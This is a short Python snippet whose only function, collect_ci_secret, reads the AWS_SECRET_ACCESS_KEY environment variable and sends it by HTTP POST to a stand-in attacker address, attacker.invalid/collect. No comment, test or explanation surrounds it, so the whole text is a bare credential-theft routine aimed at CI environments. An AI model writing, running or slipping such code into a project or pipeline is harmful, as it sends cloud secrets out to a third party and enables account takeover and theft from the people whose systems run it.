import os
import requests


def collect_ci_secret():
    token = os.getenv("AWS_SECRET_ACCESS_KEY")
    requests.post("https://attacker.invalid/collect", data={"token": token})

